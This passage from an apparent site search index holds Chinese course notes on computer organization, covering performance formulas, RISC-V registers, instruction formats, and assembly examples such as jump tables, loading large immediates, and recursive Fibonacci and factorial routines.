<p>\u5c06\u4e0a\u9762\u4e24\u6761\u516c\u5f0f\u6574\u5408\u5f97\u5230\uff1a</p> \\[ CPU\\ Time = Instruction\\ Count\\times CPI\\times Clock\\ Cycle\\ Time= \\frac{Instruction\\ Count\\times CPI} {Clock\\ Rate} \\] <p>MIPS: \u767e\u4e07\u6307\u4ee4\u6570\u6bcf\u79d2</p> <p>\u5373 \\(\\frac{Instruction\\ Count}{Execution\\ Time \\times 10^6}\\) \uff0c\u4f46\u662f MIPS \u53ea\u662f\u63cf\u8ff0\u540c\u4e00\u4e2a\u5904\u7406\u5668\u6216\u540c\u4e00\u4e2a\u6307\u4ee4\u96c6\u5bf9\u4e8e\u4efb\u52a1\u7684\u4f18\u5316\uff0c\u4e0d\u662f MIPS \u8d8a\u9ad8\u6027\u80fd\u5c31\u8d8a\u9ad8\u3002</p>"},{"location":"Courses/CO/Chapter1/#eight-great-ideas","title":"Eight Great Ideas","text":"<ul> <li>Design for Moore\u2019s Law \uff08\u8bbe\u8ba1\u7d27\u8ddf\u6469\u5c14\u5b9a\u5f8b\uff09</li> <li>Use Abstraction to Simplify Design (\u91c7\u7528\u62bd\u8c61\u7b80\u5316\u8bbe\u8ba1)<ul> <li>\u5206\u5c42\u8bbe\u8ba1\uff0c\u5404\u5c42\u4e4b\u95f4\u63d0\u4f9b\u63a5\u53e3</li> </ul> </li> <li>Make the Common Case Fast (\u52a0\u901f\u5927\u6982\u7387\u4e8b\u4ef6)<ul> <li>\u4f18\u5148\u4f18\u5316\u5927\u6982\u7387\u4e8b\u4ef6\u5bf9\u6027\u80fd\u7684\u5f71\u54cd\u66f4\u5927</li> </ul> </li> <li>Performance via Parallelism (\u901a\u8fc7\u5e76\u884c\u63d0\u9ad8\u6027\u80fd)</li> <li>Performance via Pipelining (\u901a\u8fc7\u6d41\u6c34\u7ebf\u63d0\u9ad8\u6027\u80fd)</li> <li>Performance via Prediction (\u901a\u8fc7\u9884\u6d4b\u63d0\u9ad8\u6027\u80fd)</li> <li>Hierarchy of Memories (\u5b58\u50a8\u5668\u5c42\u6b21)</li> <li>Dependability via Redundancy (\u901a\u8fc7\u5197\u4f59\u63d0\u9ad8\u53ef\u9760\u6027)</li> </ul>"},{"location":"Courses/CO/Chapter2/","title":"CH 2. RISC-V","text":""},{"location":"Courses/CO/Chapter2/#chapter-2-instruction-language-of-machine","title":"Chapter 2. Instruction: Language of Machine","text":"<p> \u7ea6 1952 \u4e2a\u5b57  248 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>\u7cbe\u7b80\u6307\u4ee4\u96c6</p> <p>\u524d\u9762\u6211\u4eec\u8ba8\u8bba\u8fc7\uff0c\u8ba1\u7b97\u673a\u7684 Performance \u53d7\u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u5f71\u54cd\uff0c\u800c\u4e0d\u540c\u7684 CPU \u53ef\u80fd\u4f7f\u7528\u4e0d\u540c\u7684\u6307\u4ee4\u67b6\u6784\u96c6\uff08ISA\uff09\u3002</p> <p>RSIC-V \u662f UC Berkeley \u5927\u5b66\u8bbe\u8ba1\u7684\u7b2c\u4e94\u4ee3RISC\u82af\u7247\uff0c\u5176\u7279\u70b9\u662f\u5f00\u6e90\u3001\u67b6\u6784\u7b80\u5355\u3001\u6a21\u5757\u5316\u8bbe\u8ba1\uff0c\u662f\u672c\u8bfe\u7a0b\u6240\u8981\u8bb2\u89e3\u7684 ISA\u3002</p>"},{"location":"Courses/CO/Chapter2/#_1","title":"\u5bc4\u5b58\u5668","text":"<p>RISC-V \u4e00\u5171\u6709 32 \u4e2a\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u5bbd\u5ea6\u5747\u4e3a 64 \u4f4d\uff0c\u547d\u540d\u4ece <code>x0</code> \u5230 <code>x31</code> </p> <p>\u4e0d\u540c\u4e8e8086\uff0cRISC-V\u4e2d <code>1 word = 32 bit</code>\uff0c\u6240\u4ee5\u5bc4\u5b58\u5668\u5927\u5c0f\u4e3a <code>doubleword</code></p> <p></p> <ul> <li><code>x0</code> \u4fdd\u6301\u5e38\u6570 <code>0</code> \uff0c\u5e38\u7528\u4e8e\u51fd\u6570\u8fd4\u56de\u65f6\u4f5c\u4e3a\u65e0\u610f\u4e49\u5730\u5740\u7684\u63a5\u6536\u65b9\uff1a <code>jalr x0, 0(x1)</code><ul> <li><code>x0</code> \u7684\u8bfb\u5199\u662f\u65e0\u6548\u7684\uff0c\u5904\u7406\u5668\u5e76\u4e0d\u4f1a\u53bb\u8bfb\u5199\u5b83\u7684\u503c</li> </ul> </li> <li><code>x1</code> \u7528\u6765\u4fdd\u5b58\u8fd4\u56de\u5730\u5740\uff0c\u5373 <code>return address</code> \u3002<ul> <li>\u5728\u8c03\u7528\u51fd\u6570\u524d\uff0c\u4f7f\u7528 <code>jal x1, FUNC_ADDR</code> \u4fdd\u5b58PC\u5f53\u524d\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\uff0c\u5373 <code>PC+4</code> \u3002</li> <li>\u8c03\u7528\u7684\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u4f7f\u7528 <code>jalr x0, 0(x1)</code> \u8fd4\u56de\u8c03\u7528\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7ee7\u7eed\u6267\u884c\u3002</li> </ul> </li> <li><code>x2</code> \u5373\u6808\u6307\u9488\uff0c\u59cb\u7ec8\u6307\u5411\u6808\u9876\u5143\u7d20\u3002\u6808\u4ece\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u3002</li> <li><code>x3</code> \u6307\u5411\u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u6570\u636e\u533a\u7684\u8d77\u59cb\u5730\u5740\uff0c\u79f0\u4e3a <code>global pointer</code> \uff0c\u7528\u4e8e\u8bbf\u95ee\u548c\u7ba1\u7406\u5168\u5c40\u53d8\u91cf\u3002</li> <li><code>x4</code> \u662f\u7ebf\u7a0b\u5bc4\u5b58\u5668\uff0c\u6307\u5411\u5f53\u524d\u7ebf\u7a0b\u7684\u5c40\u90e8\u5bc4\u5b58\u5668\uff0c\u5373\u7ebf\u7a0b\u79c1\u6709\u7684\u6570\u636e\u533a\u57df\u3002</li> <li><code>x5-x7</code> \u4ee5\u53ca <code>x28-x31</code> \u662f\u4e34\u65f6\u5bc4\u5b58\u5668\uff0c\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u8ba1\u7b97\u7684\u4e2d\u95f4\u7ed3\u679c\u6216\u4e34\u65f6\u53d8\u91cf\uff0c\u5b83\u4eec\u662f\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u3002</li> <li><code>x8-x9</code> \u4ee5\u53ca <code>x18-x27</code> \u4e5f\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u4e34\u65f6\u6570\u636e\uff0c\u4e0d\u8fc7\u5b83\u4eec\u662f\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\uff0c\u5373\u88ab\u8c03\u7528\u51fd\u6570\u5728\u5f00\u5934\u548c\u7ed3\u5c3e\u5206\u522b\u9700\u8981\u5165\u6808\u548c\u51fa\u6808\u4ee5\u6062\u590d\u5b83\u4eec\u7684\u503c\u3002<ul> <li><code>x8</code> \u4e00\u822c\u4e5f\u7528\u4f5c\u5e27\u6307\u9488 <code>frame pointer</code> \uff0c\u6307\u5411\u6808\u7684\u5e95\u7aef</li> </ul> </li> <li><code>x10-x17</code> \u662f\u53c2\u6570\u5bc4\u5b58\u5668\uff0c\u51fd\u6570\u8c03\u7528\u7684\u524d\u516b\u4e2a\u53c2\u6570\u4f1a\u5b58\u50a8\u5728\u8fd9\u4e9b\u5bc4\u5b58\u5668\u4e2d\uff0c\u4f46\u5982\u679c\u53c2\u6570\u8d85\u8fc7 8 \u4e2a\u5c31\u9700\u8981\u653e\u5230\u6808\u4e2d\u4f20\u9012\uff08\u5982\u679c\u53c2\u6570\u4e3a 8 bytes\uff0c<code>sp+8</code> \u662f\u7b2c\u4e5d\u4e2a\u53c2\u6570\uff0c<code>sp+16</code> \u662f\u7b2c\u5341\u4e2a\u53c2\u6570...\uff09\u3002\u540c\u65f6\uff0c\u8fc7\u7a0b\u7684\u7ed3\u679c\u4e5f\u4f1a\u653e\u5230\u8fd9\u4e9b\u5bc4\u5b58\u5668\u4e0a\uff0c\u5bf9\u4e8eC\u8bed\u8a00\u8fd9\u79cd\u53ea\u6709\u4e00\u4e2a\u8fd4\u56de\u503c\u7684\u8bed\u8a00\uff0c\u53ef\u80fd\u53ea\u4f1a\u7528\u5230 <code>x10</code> \u3002</li> </ul> <p>Preserved on call</p> <p>\u662f\u5426\u4fdd\u8bc1\u8c03\u7528\u524d\u540e\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u4e0d\u53d8\u3002\u5982\u679c\u4e3a <code>yes</code>\uff0c\u5219\u88ab\u8c03\u7528\u51fd\u6570\u5f00\u5934\u7ed3\u5c3e\u5206\u522b\u8981\u5c06\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5165\u6808\u51fa\u6808\u4ee5\u6062\u590d\u5b83\u4eec\u7684\u503c\uff1b\u5982\u679c\u4e3a <code>no</code> \uff0c\u5219\u9700\u8981\u4e3b\u51fd\u6570\u4e0a\u81ea\u884c\u5165\u6808\u51fa\u6808\u6062\u590d\u503c\u3002</p> <p>\u8fc7\u7a0b\u8c03\u7528</p> <p>RISC-V \u4f7f\u7528 <code>jal x1, ProcedureAddress</code> \u6765\u8c03\u7528\u5b50\u7a0b\u5e8f\uff0c\u4f7f\u7528 <code>jalr x0, 0(x1)</code> \u8fd4\u56de\u6bcd\u7a0b\u5e8f\u3002\u5728\u7a0b\u5e8f\u8c03\u7528\u4e2d\uff0cRISC-V \u5fc5\u987b\u4f7f\u7528\u989d\u5916\u7684\u6307\u4ee4\u5728\u8c03\u7528\u524d\u5c06\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u538b\u5165\u5185\u5b58\u6808\uff0c\u5728\u8c03\u7528\u540e\u5c06\u8fd9\u4e9b\u5bc4\u5b58\u5668\u6570\u636e\u5f39\u51fa\u5185\u5b58\u6808\uff0c\u4ece\u800c\u4fdd\u8bc1\u8fd9\u4e9b\u6570\u636e\u7684\u4e0d\u53d8\u6027\u3002</p>"},{"location":"Courses/CO/Chapter2/#_2","title":"\u6307\u4ee4\u683c\u5f0f","text":"<p>\u4e0d\u540c\u4e8e 8086 \u65e0\u5b9a\u957f\u7684\u673a\u5668\u7801\uff0cRISC-V \u7684\u6307\u4ee4\u90fd\u662f 32 bit \uff0c\u4e14\u6709\u56fa\u5b9a\u683c\u5f0f\u7684\u3002</p> <p></p> <p>\u53ea\u6709 <code>load</code> \u548c <code>store</code> \u7cfb\u5217\u53ef\u4ee5\u8bbf\u95ee Memory</p> <p></p> <p>RISC-V \u6307\u4ee4\u683c\u5f0f\u5982\u4e0b\uff1a</p> <p></p> <ul> <li><code>opcode</code>: \u6307 operation \u7684\u7f16\u7801\uff0c\u5927\u90e8\u5206\u65f6\u5019\u9700\u8981\u548c <code>funct3</code> \u548c <code>funct7</code> \u4e00\u8d77\u51b3\u5b9a\u6307\u4ee4\u7684\u79cd\u7c7b\u3002</li> <li><code>rd</code>: \u5373 Destination Register \uff0c\u76ee\u6807\u5bc4\u5b58\u5668\u3002</li> <li><code>funct3</code>: 3 bit \u7684 function code\uff0c\u76f8\u5f53\u4e8e additional opcode\u3002</li> <li><code>rs1</code>: \u5373 First Source Register \uff0c\u7b2c\u4e00\u4e2a\u6e90\u5bc4\u5b58\u5668\u3002</li> <li><code>rs2</code>: \u5373 Second Source Register \uff0c\u7b2c\u4e8c\u4e2a\u6e90\u5bc4\u5b58\u5668\u3002</li> <li><code>funct7</code>: 7 bit \u7684 function code\uff0c\u76f8\u5f53\u4e8e additional opcode\u3002</li> <li><code>i</code>: \u7acb\u5373\u6570\uff0c\u9700\u8981\u6ce8\u610f\u662f\u6709\u7b26\u53f7\u6570\uff0c\u4f8b\u5982 <code>i[11:0]</code> \u7684\u8303\u56f4\u662f \\(-2^{11}\\) ~ \\(2^{11}-1\\)</li> </ul> <p>\u53ef\u4ee5\u89c2\u5bdf\u5230 I-Type \u6709\u4e24\u4e2a\u6761\u76ee\uff0c\u4e0b\u9762\u90a3\u4e2a\u6761\u76ee\u53ea\u5bf9\u5e94 <code>slli</code>,<code>srli</code>,<code>srai</code> \uff0c\u56e0\u4e3a\u7acb\u5373\u6570\u79fb\u4f4d\u64cd\u4f5c\u5e76\u4e0d\u53ef\u80fd\u5bf9\u4e00\u4e2a 64 \u4f4d\u5bc4\u5b58\u5668\u8fdb\u884c\u5927\u4e8e 63 \u4f4d\u7684\u79fb\u4f4d\u64cd\u4f5c\uff0c\u56e0\u6b64 immediate \u4e2d\u53ea\u6709\u540e 6 \u4f4d\u80fd\u5b9e\u9645\u7528\u4e0a\uff0c\u56e0\u6b64\u524d\u516d\u4f4d\u53ef\u4ee5\u7528\u6765\u5f53\u4f5c\u989d\u5916\u7684\u64cd\u4f5c\u7801\u5b57\u6bb5\u3002</p> UJ \u683c\u5f0f\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 <code>jal</code> \u548c SB \u683c\u5f0f\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 <code>branch</code> <p>\u6ce8\u610f\u5230\uff0c\u8fd9\u4e24\u4e2a\u683c\u5f0f\u6307\u4ee4\u7684\u7acb\u5373\u6570\u6ca1\u6709\u6700\u4f4e\u4f4d\uff0c\u8fd9\u662f\u56e0\u4e3a\u5730\u5740\u504f\u79fb\u91cf\u5fc5\u987b\u662f 2 \u7684\u6574\u6570\u500d\uff0c\u5373\u6700\u4f4e\u4f4d\u9ed8\u8ba4\u770b\u4f5c 0</p> <ul> <li>Offset of <code>jal</code> : \\((-2^{20}, 2^{20}-2)\\)</li> <li>Offset of <code>branch</code> : \\((-2^{12} , 2^{12}-2)\\)</li> </ul> R-typeI-typeOthers <p></p> <p></p> <p></p> \u4f8b\u5b50\uff1a\u5bf9\u4e8e R \u578b\u6307\u4ee4 <code>add</code> <p></p> \u8003\u5bdf\u5bf9 IS \u7406\u89e3\u7684\u9898\u76ee <p>\u5047\u8bbe\u6709\u4e00\u6307\u4ee4 <code>rpt x29, loop</code> \u7684\u6548\u679c\u4e3a <code>x29</code> \u81ea\u51cf <code>1</code> \uff0c\u82e5 <code>x29&gt;0</code> \uff0c\u5219\u8df3\u8f6c\u5230 <code>loop</code> \u3002\u5982\u679c\u8be5\u6307\u4ee4\u5728 RISC-V \u6307\u4ee4\u96c6\u5185\uff0c\u5b83\u5e94\u8be5\u662f\u4ec0\u4e48\u683c\u5f0f\u7684\u3002</p> <p>\u7b54\u6848\u5176\u5b9e\u662f U-type \uff0c\u56e0\u4e3a\u5b83\u53ea\u7528\u5230\u4e00\u4e2a rd \u5bc4\u5b58\u5668\u548c\u4e00\u4e2a\u7acb\u5373\u6570\u5730\u5740\u3002</p> <p>RISC-V \u4f7f\u7528 <code>Branch</code> \u7cfb\u5217\u6307\u4ee4\u8fdb\u884c\u8df3\u8f6c\uff0c\u4e3e\u4e00\u4f8b\u6f14\u793a\u5176\u5e94\u7528\uff1a</p> <pre><code>C CODE:\nif(i==j) f = g + h;\nelse f = g - h;\n\nRISC-V ASM CODE:\nassume x19:f, x20:g, x21:h, x22:i, x23:j\n    bne x22, x23, else # goto else if i != j\n    add x19, x20, x21  # f = g + h\n    beq x0, x0, EXIT   # goto EXIT\nelse:\n    sub x19, x20, x21  # f = g - h\nEXIT:\n    ...statement\n</code></pre> <p>\u540c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 <code>jal</code> \u548c <code>jalr</code> (Jump And Link Register) \u6765\u8fbe\u6210C\u8bed\u8a00 switch \u8bed\u53e5\u7684\u6548\u679c\uff1a</p> <pre><code>comment @\n\u6a21\u62df Jump Address Table\n@\n\nC CODE:\nswitch(k){\n    case 0: f = i + j; break;\n    case 1: f = g + h; break;\n    case 2: f = g - h; break;\n    case 3: f = i - j; break;\n}\n\nRISC-V ASM CODE:\nassume x20~x25:f~k, x5:constant 4, x6:JumpTable \u7684\u9996\u5730\u5740\n    blt x25, x0, EXIT\n    bge x25, x5, EXIT # if k &lt; 0 or k &gt;= 4, goto EXIT\n    slli x7, x25, 3   # x7 = k * 8 \uff0c\u56e0\u4e3a\u5730\u5740\u8868\u6bcf\u4e00\u9879\u90fd\u662f 8 Bytes \u7684\n    add x7, x7, x6    # x7 = Address of JumpTable[k]\n    ld x7, 0(x7)      # x7 = JumpTable[k]\n    jalr x1, 0(x7)    # jump\n    ...Next Instruction\n    ...statement\n    ...\nL0:\n    add x20, x23, x24 # f = i + j\n    jalr x0, 0(x1)    # return Next Instruction\nL1:\n    add x20, x21, x22 # f = g + h\n    jalr x0, 0(x1)\nL2:\n    sub x20, x21, x22 # f = g - h\n    jalr x0, 0(x1)\nL3:\n    sub x20, x23, x24 # f = i - j\n    jalr x0, 0(x1)\n</code></pre> <p>\u4e0e8086\u4e0d\u540c\uff0cRISC-V\u4e2d\u8df3\u8f6c\u6307\u4ee4\u7684\u7acb\u5373\u6570\u53d6\u503c\u5e76\u4e0d\u662f\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</p> <p>\u51e0\u79cd\u5bfb\u5740\u65b9\u5f0f</p> <p></p> <ul> <li>\u7acb\u5373\u6570\u5bfb\u5740\uff08\u4ece\u6307\u4ee4\u4e2d\u53d6\u7acb\u5373\u6570\u6570\u636e\uff09</li> <li>\u5bc4\u5b58\u5668\u5bfb\u5740\uff08\u4ece Register \u4e2d\u53d6\u6570\u636e\uff09</li> <li>\u57fa\u5740\u5bfb\u5740\uff08\u4ece Memory \u4e2d\u53d6\u6570\u636e\uff09</li> <li>PC\u76f8\u5bf9\u5bfb\u5740\uff08\u6570\u636e\u4e3a\u76f8\u5bf9PC\u7684\u7acb\u5373\u6570\uff09</li> </ul> <p>More Example: String Copy</p> <p></p> <p>(21-22 Final) \u5982\u4f55\u5728\u4e0d\u9002\u7528\u989d\u5916\u5bc4\u5b58\u5668\u7684\u60c5\u51b5\u4e0b\u4ea4\u6362 <code>x10</code> \u548c <code>x11</code> \u7684\u503c</p> <pre><code>xor x10, x10, x11\nxor x11, x10, x11\nxor x10, x10, x11\n</code></pre>"},{"location":"Courses/CO/Chapter2/#_3","title":"\u6742\u9879","text":""},{"location":"Courses/CO/Chapter2/#_4","title":"\u5927\u6570\u52a0\u8f7d","text":"<p>\u7531\u4e8e\u53d7\u6307\u4ee4\u5bbd\u5ea6\u9650\u5236\uff0c\u7acb\u5373\u6570\u5bbd\u5ea6\u4e0d\u80fd\u8d85\u8fc7 12bit\uff0c\u4f46\u662f\u8fd9\u4e2a\u5927\u5c0f\u9650\u5236\u5e76\u4e0d\u80fd\u6db5\u76d6\u8ba1\u7b97\u673a\u7684\u5e38\u89c4\u5de5\u4f5c\u8303\u56f4\u3002\u4e3a\u6b64\uff0cRISC-V \u901a\u8fc7\u7ec4\u5408 <code>addi</code> \u548c <code>lui</code>(Load Upper Immediate) \u6307\u4ee4\u6765\u5b9e\u73b0\u5b58\u50a8 32bit \u5927\u5c0f\u7acb\u5373\u6570\uff1a</p> <p><code>lui</code> \u6307\u4ee4\u7684\u4f5c\u7528\u4e3a\u8bfb\u53d6\u4e00\u4e2a 20bit \u7684\u7acb\u5373\u6570\uff0c\u5b58\u50a8\u8fdb\u5bc4\u5b58\u5668\u4f4e 32 \u4f4d\u7684\u9ad8 20 \u4f4d\uff0c\u5de6\u4fa7 32 \u4f4d\u5168\u90e8\u586b\u5145 bit 31\uff08\u7c7b\u4f3c\u7b26\u53f7\u6269\u5145\uff09\uff0c\u53f3\u4fa7 12 \u4f4d\u5168\u90e8\u586b\u5145 0\uff0c\u5176\u6307\u4ee4\u683c\u5f0f\u4e3a\uff1a</p> <pre><code>31                    11       6        0\n+---------------------+--------+--------+\n|  immediate[31:12]   |   rd   | Opcode |\n+---------------------+--------+--------+\n        20bits           5bits    7bits\n</code></pre> <p>\u82e5 <code>addi</code> \u6240\u52a0\u8f7d\u7684 12bit \u7acb\u5373\u6570\u7684\u6700\u9ad8\u4f4d\u4e3a 0\uff0c\u90a3\u4e48\u5f88\u660e\u663e\u7b26\u5408\u903b\u8f91\uff1a</p> <pre><code>lui x19, 976 # 0000 0000 0011 1101 0000\naddi x19, x19, 1280 # 0101 0000 0000\n# [63:32]0,00000000 00111101 0000//0101 00000000 = 976*2^{12} + 1280\n</code></pre> <p>\u4f46\u662f\u7531\u4e8e RISC-V \u7684\u7acb\u5373\u6570\u90fd\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\uff0c\u82e5 <code>addi</code> \u52a0\u8f7d\u7684\u6570\u6700\u9ad8\u4f4d\u4e3a 1 \uff0c\u8be5\u7acb\u5373\u6570\u4f1a\u88ab\u89c6\u4e3a\u8d1f\u6570\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c sign extension\uff08\u5373\u7528 1 \u586b\u5145\u81f3 64bit\uff09\uff0c\u8fd9\u79cd\u60c5\u51b5\u76f8\u5f53\u4e8e\u989d\u5916\u589e\u52a0\u4e86 <code>0xFFFFF000</code> \uff0c\u4e3a\u4e86\u8865\u507f\u8fd9\u4e2a\u9519\u8bef\uff0c\u9700\u8981\u52a0\u4e0a <code>0x00001000</code> \u62b5\u6d88\uff0c\u5373\u5bf9 <code>lui</code> \u7684\u7acb\u5373\u6570\u52a0\u4e00\u3002\u4f8b\u5982\uff0c\u52a0\u8f7d 976 * 2<sup>12</sup> + 2304 = 4000000\uff1a</p> <pre><code>lui x19, 977         # 976 + 1\naddi x19, x19, 2304  # \u8ba1\u7b97\u673a\u89c6\u5176\u4e3a negative\n</code></pre> Addition <p></p> <p>\u5728 Compiler Explorer \u4e2d\u7528 RISC-V(32bit) gcc \u7f16\u8bd1\u4e0b\u5217\u4ee3\u7801\uff1a</p> <pre><code>int main(void) {\n    int a;\n    a = 4000000;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>a = 4000000</code> \u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u4e3a\uff1a</p> <pre><code> 003d17b7\n\u00a0lui \u00a0 \u00a0a5,0x3d1 # a5 == x15, 0x3d1 = 977\n\u00a090078793\n\u00a0addi \u00a0 a5,a5,-1792 # -1792 == 2304\n fef42623\n\u00a0sw a5,-20(s0)\n</code></pre> <p>(23-24 Final) \u5c06 <code>0x12345678ABCDEF</code> \u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 <code>x10</code> \u4e2d</p> <pre><code>lui x10, 0x12345\naddi x10, x10, 0x678  # x10 = 0x12345678\nlui x11, 0xABD        # 0xABC + 1\naddi x11, x11, 0xDEF  # x11 = 0xABCDEF, also `addi x11, x11, -529`\nslli x10, x10, 24\nadd x10, x10, x11 # or x10, x10, x11\n</code></pre>"},{"location":"Courses/CO/Chapter2/#_5","title":"\u5bfb\u5740","text":"<p>\u91c7\u7528\u5c0f\u7aef\u5bfb\u5740 little endian \u3002</p> <p></p> <p>\u540c\u65f6\uff0cRISC-V\u6ca1\u6709\u8981\u6c42\u8981\u5b57\u8282\u5bf9\u9f50</p>"},{"location":"Courses/CO/Chapter2/#_6","title":"\u5d4c\u5957\u8c03\u7528","text":"<p>\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff1a</p> <p>\u5f53\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u4f7f\u7528\u6808\u6765\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u5730\u5740\u3001\u4f20\u9012\u7684\u53c2\u6570\uff08\u4e14 <code>x10</code> \u8fd8\u5145\u5f53 return \u503c\uff09\u3002\u4f8b\u5982\uff0c\u5c06\u4e0b\u5217\u9012\u5f52\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u51fd\u6570\u8f6c\u6362\u6210 RISC-V \u6c47\u7f16\u8bed\u8a00\uff1a</p> <pre><code>int fib(int n) {\n    if (n == 0)\n        return 0;\n    else if (n == 1)\n        return 1;\n    else\n        return fib(n-1) + fib(n-2);\n}\n</code></pre> <p>\u5b8c\u5168\u4f18\u5316\u7248\u672c\uff1a</p> <pre><code>fib:\n    beq x10, x0, done// n == 0\n    addi x5, x0, 1\n    beq x10, x5, done// n == 1\n//\u5206\u914d\u6808\u7a7a\u95f4\n    addi x2, x2, -16 // allowcate stack space\n    sd x10, 8(x2)    // push x10 (the value of n)\n    sd x1, 0(x2)     // push x1 (the return address)\n    addi x10, x10, -1\n    jal x1, fib      // fib(n-1)\n    ld x5, 8(x2)     // load n in this loop\n    sd x10, 8(x2)    // push fib(n-1)\n    addi x10, x5, -2 // x10 = n-2\n    jal x1, fib      // fib(n-2)\n    ld x5, 8(x2)     // x5 = fib(n-1)\n    add x10, x10, x5 // x10 = fib(n-1) + fib(n-2)\n//\u6062\u590d\u6808\n    ld x1, 0(x2)     // load return address\n    addi x2, x2, 16  // restore the stack\ndone:\n    jalr x0, x1\n</code></pre> <p>\u65e0\u4f18\u5316\uff0c\u4f46\u662f\u6613\u4e8e\u7406\u89e3\u7684\u7248\u672c\uff1a</p> <pre><code>main:\n    addi a0, x0, 6\n    jal ra, fib    # call fib(6)\n    add x0, x0, x0 # NOP\n\nfib:\n    addi sp, sp, -16\n    sw s0, 8(sp)\n    sw ra, 0(sp)\n\n    add s0, a0, x0\n    beq s0, x0, done0 # if(n==0) return 0\n    addi t0, x0, 1\n    beq s0, t0, done0 # if(n==1) return 1\n    addi a0, s0, -1  # n-1\n\n    addi sp, sp, -16 # \u8c03\u7528\u8005\u4fdd\u5b58\n    sw t0, 8(sp)\n    sw t1, 0(sp)\n\n    jal ra, fib      # call fib(n-1)\n\n    lw t0, 8(sp)     # \u8c03\u7528\u8005\u6062\u590d\n    lw t1, 0(sp)\n    addi sp, sp, 16\n\n    add t0, a0, x0   # t0 = fib(n-1)\n    addi a0, s0, -2  # n-2\n\n    addi sp, sp, -16 # \u8c03\u7528\u8005\u4fdd\u5b58\n    sw t0, 8(sp)\n    sw t1, 0(sp)\n\n    jal ra, fib      # call fib(n-2)\n\n    lw t0, 8(sp)     # \u8c03\u7528\u8005\u6062\u590d\n    lw t1, 0(sp)\n    addi sp, sp, 16\n\n    add t1, a0, x0   # t1 = fib(n-2)\n    add a0, t0, t1   # a0 = fib(n-1) + fib(n-2)\n    jal x0, done\ndone0:\n    add a0, x0, s0   # a0 = n\ndone:\n    lw s0, 8(sp)\n    lw ra, 0(sp)\n    addi sp, sp, 16\n    jalr x0, ra, 0   # return a0\n</code></pre> <p>\u9636\u4e58\uff1a</p> <pre><code>long long int fact(long long int n) {\n    if ( n &lt; 1 ) return 1;\n    else         return n * fact(n - 1);\n}\n</code></pre> <pre><code>fact: \n      addi sp, sp, -16      # adjust stack for 2 items\n      sd   x1, 8(sp)        # save the return address\n      sd   x10, 0(sp)       # save the argument n\n      addi x5, x10, -1      # x5 = n - 1\n      bge  x5, x0, L1       # if n &gt;= 1, go to L1\n      addi x10, x0, 1       # return 1\n      addi sp, sp, 16       # adjust stack to pop 2 items (no need to ld)\n      jalr x0, 0(x1)        # return to caller\nL1:   \n      addi x10, x10, -1     # n &gt;= 1: argument gets (n - 1)\n      jal  x1, fact         # call fact with (n - 1)\n      addi x6, x10, 0       # move result of fact (n - 1) to x6\n      ld   x10, 0(sp)       # restore argument n\n      ld   x1, 8(sp)        # restore the return address\n      addi sp, sp, 16       # adjust stack to pop 2 items\n      mul  x10, x10, x6     # return n * fact(n - 1)\n      jalr x0, 0(x1)        # return to the caller\n</code></pre> <p>From Minjoker</p> <p>\u8bfb\u53d6\u548c\u5b58\u50a8\u65f6\u90fd\u8981\u6ce8\u610f\u4f4d\u5bbd</p> <p>\u5bf9\u57fa\u5740\u4e3a <code>a0</code> \u7684 <code>int</code> \u578b\u6570\u7ec4\uff0c\u53d6\u7b2c <code>i</code> \u4e2a\u5143\u7d20\uff0c\u9700\u8981\u4f7f\u7528 <code>load word</code> \u6307\u4ee4\uff1a<code>lw rd, i*4(a0)</code> </p> <p>\u50cf\u6211\u4eec\u9012\u5f52\u4f7f\u7528\u5b58 64bit \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5c31\u4f7f\u7528 <code>load doubleword</code></p> <p>\u4e92\u76f8\u8c03\u7528\uff0c\u5b58\u5728\u4e24\u4e2ara\uff1a</p> <pre><code>int foo(a, b) {\n    int c = bar(a, b);\n    return 2 * c;\n}\n\nint bar(a, b) {\n    return a + b;\n}\n</code></pre> <pre><code>foo:\n    addi sp, sp, -24  # \u5f00\u8f9f\u6808\u7a7a\u95f4\uff0c\u5c06\u51fd\u6570\u8fd4\u56de\u5730\u5740 ra \u4ee5\u53ca\n    sd s0, 0(sp)      # \u53ef\u80fd\u7528\u5230\u7684\u4e34\u65f6\u6808\u5bc4\u5b58\u5668\u90fd\u538b\u5165\u6808\u4e2d\uff0c\n    sd s1, 8(sp)      # \u5728\u51fd\u6570\u8fd4\u56de\u524d\uff0c\u6062\u590d\u5b83\u4eec\u7684\u503c\n    sd ra, 16(sp)     # \u901a\u5e38\u5f00\u8f9f n+1 \u4e2a\u4f4d\u7f6e\n    add s0, x0, a0    # s0 = a\n    add s1, x0, 